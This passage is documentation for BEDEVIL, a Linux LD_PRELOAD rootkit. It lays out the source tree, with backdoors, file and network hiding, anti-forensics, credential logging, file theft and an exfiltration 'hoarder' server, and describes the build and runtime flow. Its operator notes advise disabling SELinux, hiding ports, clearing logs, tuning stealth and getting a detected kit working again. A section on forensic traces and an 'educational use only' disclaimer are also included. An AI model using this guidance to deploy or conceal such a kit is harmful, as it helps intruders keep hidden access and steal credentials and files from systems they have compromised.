## 0x06 TECHNICAL ARCHITECTURE

**Source Code Organization:**

```c
bdvl/
├── config.ini              # Configuration file
├── setup.py                # Build system (config parser)
├── Makefile                # Build instructions
├── src/
│   ├── bdv.c               # Main rootkit source (monolithic)
│   ├── include/            # Generated headers
│   │   ├── config.h        # Generated from config.ini
│   │   ├── bdv.h           # Generated symbol arrays
│   │   ├── arrays.h        # Generated arrays
│   │   ├── banner.h        # ASCII art
│   │   ├── types.h         # Struct definitions
│   │   └── sanity.h        # Sanity checks
│   ├── doors/              # Backdoor implementations
│   │   ├── accept.c        # Accept() backdoor
│   │   ├── pam/            # PAM backdoor
│   │   │   ├── pam_hooks.c
│   │   │   ├── clean.c     # Utmp/btmp cleaning
│   │   │   └── sshdpatch/  # SSHD configuration patching
│   │   └── icmp/           # ICMP backdoor
│   │       └── spawn.c
│   ├── gid/                # Magic GID management
│   │   ├── auto.c          # Automatic GID rotation
│   │   ├── change.c        # Manual GID change
│   │   └── taken.c         # GID collision detection
│   ├── hiding/             # Hiding subsystems
│   │   ├── files/          # File hiding logic
│   │   ├── procnet/        # Network hiding (/proc/net/tcp)
│   │   ├── evasion/        # Anti-forensics
│   │   ├── xattr.c         # Extended attribute hiding
│   │   ├── mapsforge.c     # Process map forgery
│   │   └── forgeprofile.c  # Profile forgery
│   ├── hooks/              # Function hooks
│   │   ├── libdl/          # dlsym/dlopen hooks + symbol resolver
│   │   ├── dir/            # Directory operation hooks
│   │   ├── open/           # File open hooks
│   │   ├── stat/           # Stat hooks
│   │   ├── exec/           # Exec hooks
│   │   ├── pwd/            # Password database hooks
│   │   ├── gid/            # GID hooks
│   │   ├── utmp/           # Utmp hooks
│   │   ├── syslog/         # Syslog hooks
│   │   ├── audit/          # Audit hooks
│   │   └── [many more]/
│   ├── install/            # Installation logic
│   │   ├── cfg/            # Configuration generation
│   │   ├── ldpatch/        # ld.so patching
│   │   └── inject/         # Process injection
│   ├── steal/              # File stealing
│   ├── log/                # Logging functionality
│   └── misc/               # Utilities
└── etc/
    ├── auto.sh             # Automated deployment script
    ├── depinstall.sh       # Dependency installer
    ├── icmp.sh             # ICMP backdoor trigger
    └── hoarder.c           # File collection server
```

**Compilation Architecture:**

```c
config.ini
    |
    v
setup.py (Python ConfigParser + eval())
    |
    +----> Parse config.ini
    +----> Evaluate Python expressions (RANDOM, RANDPORT, etc.)
    +----> Generate src/include/config.h (#defines)
    +----> Generate src/include/bdv.h (symbol arrays)
    +----> Generate src/include/arrays.h (data arrays)
    |
    v
gcc compilation
    |
    +----> Compile src/bdv.c (includes all sub-files)
    +----> Link: -lc -ldl -lcrypt -lpcap
    +----> Output: bdvl.so.<arch>
    |
    v
strip (remove symbols)
    |
    v
build/bdvl.so.x86_64
build/bdvl.so.i686
build/<timestamp>.nfo (evaluated config for reference)
```

**Runtime Architecture:**

```c
Process Start
    |
    v
ld.so reads preload path (patched location)
    |
    v
Loads bdvl.so
    |
    v
plsdomefirst() constructor
    |
    +----> Initialize static variables
    +----> Set up signal handlers
    |
    v
__libc_start_main() hook
    |
    +----> Initialize mvbc (read BDVL_CONFIG)
    +----> Check if installation trigger
    +----> Check for anti-forensic conditions
    +----> Start GID rotation timer
    +----> Start xattr rotation timer
    +----> Start file cleanse timer
    +----> Check/repair persistence
    |
    v
Normal process execution
    |
    +----> All libc calls go through BEDEVIL hooks
    +----> Hooks check hiding conditions
    +----> Hooks trigger backdoors
    +----> Hooks log credentials
    +----> Hooks steal files
    |
    v
Process Exit
```

**Data Structures:**

```c
typedef struct bdvcfg_t {
    // Magic values
    unsigned int magicgid;
    char magicpass[BDPASS_LEN];
    char magicusr[BDUSR_LEN];
    char magicattr[MAGIC_ATTR_LENGTH];

    // Ports
    uint16_t hideports[MAX_HIDE_PORTS];
    uint16_t acceptport;

    // Paths
    char sopath[PATH_MAX];
    char cfgpath[PATH_MAX];
    char preloadpath[PATH_MAX];
    char installdir[PATH_MAX];
    char stealdir[PATH_MAX];

    // Hoarder
    uint32_t hoarder_ip;
    uint16_t hoarder_port;

    // Timers
    time_t install_time;
    time_t uninstall_after;
    time_t last_gid_change;
    time_t last_attr_change;

    // Custom hidden paths
    char hidepaths[MAX_HIDE_PATHS][PATH_MAX];

    // Flags
    unsigned int flags;

} bdvcfg_t;
```

This structure is serialized to disk (BDVL_CONFIG) and read by every process.

---

## 0x07 OPERATIONAL NOTES

**Security Considerations:**

1. **SELinux:**
   - Kit will likely not work with SELinux enforcing
   - Warning displayed during installation
   - Recommend disabling or setting to permissive

2. **Container Environments:**
   - May not work in Docker/LXC containers
   - LD_PRELOAD can be overridden by container runtime
   - Process injection may fail due to permissions

3. **Virtualization:**
   - Works on most hypervisors
   - auto.sh detects Xen, OpenVZ, CloudLinux
   - Some features may be limited in VPS environments

4. **File Systems:**
   - Extended attribute hiding requires xattr support
   - ext4, XFS, Btrfs supported
   - FAT/NTFS do not support xattr (xattr hiding disabled)

5. **Architecture:**
   - Tested on x86_64, i686, ARM
   - Builds for native architecture + i686 if toolchain available
   - Process injection architecture-dependent

**Operational Security:**

1. **Credentials:**
   - SAVE magic username/password from install output
   - Cannot be recovered if lost
   - Stored in BDVL_CONFIG but path is random

2. **Ports:**
   - Hidden ports must be truly hidden (not scanned/probed)
   - Recommend high ports (>32768)
   - Accept backdoor port should not be firewalled

3. **File Stealing:**
   - Can generate significant disk I/O
   - May alert IDS/monitoring systems
   - Consider disabling if stealth is critical

4. **Logs:**
   - Contain plaintext credentials
   - Clear periodically
   - Harden permissions if custom paths used

5. **Updates:**
   - Update process removes all current data
   - Backup logs before updating
   - Magic credentials will change (unless hardcoded in new config)

6. **Uninstall:**
   - Manual removal is difficult (ld.so patch)
   - Use `./bdv uninstall` for clean removal
   - May require ld.so reinstall if kit corrupted

**Forensic Traces:**

Despite stealth features, forensic artifacts include:

1. **Network:**
   - Connections to hoarder host (if used)
   - ICMP packets with specific payload sizes
   - Connections to accept backdoor port

2. **Filesystem:**
   - ld.so modification timestamps
   - Hidden directory i-nodes (visible with -ino option)
   - Extended attributes (visible with getfattr)

3. **Process:**
   - Memory maps show unusual libraries (if not hidden)
   - Process start times may be inconsistent
   - Parent/child relationships may be unusual

4. **Logs:**
   - Gap in utmp/wtmp for magic user logins
   - Btmp may show failed attempts before cleaning
   - Audit logs may show unusual activity (if auditd enabled)

**Troubleshooting:**

**Kit not loading:**
- Check LD_PRELOAD path is correct
- Verify .so architecture matches system
- Check for SELinux enforcement
- Verify dependencies installed (ldd bdvl.so.*)

**Backdoors not working:**
- Verify magic credentials correct
- Check SSHD configuration (PAM enabled?)
- Verify accept port not firewalled
- Check magic GID hasn't rotated during connection

**Files not hidden:**
- Verify GID set correctly (use `./bdv changeid` to reset)
- Check extended attributes set (getfattr)
- Filesystem may not support xattr
- Check if file matches hiding patterns

**Kit detected:**
- May have triggered anti-forensic unload
- Check for chkrootkit/rkhunter processes
- Verify LD_DEBUG not set in environment
- Kit will reload on next exec

---

## 0x08 DISCLAIMER
```
=============================================================================
                           EDUCATIONAL USE ONLY
=============================================================================

BEDEVIL is provided for educational purposes, security research, and
authorized penetration testing ONLY.

Unauthorized access to computer systems is illegal under the Computer Fraud
and Abuse Act (CFAA) and equivalent laws worldwide.

The authors, contributors, and distributors of this software:

  - Do NOT condone illegal activity
  - Are NOT responsible for misuse
  - Provide NO warranty or guarantee
  - Assume NO liability for damages

By using this software, you agree:

  - You have explicit authorization for any target system
  - You understand applicable laws in your jurisdiction
  - You accept full responsibility for your actions
  - You will use this software ethically and legally

If you do not agree to these terms, do not use this software.

=============================================================================
                        USE AT YOUR OWN RISK
=============================================================================

This software modifies critical system components including:
  - Dynamic linker (ld.so)
  - Preload mechanisms
  - System authentication (PAM)
  - Core libc functions

Improper use can result in:
  - System instability
  - Data loss
  - Security vulnerabilities
  - Permanent system damage
  - Legal consequences

Always test in isolated environments before deployment.
Always maintain backups.
Always have a recovery plan.

=============================================================================
```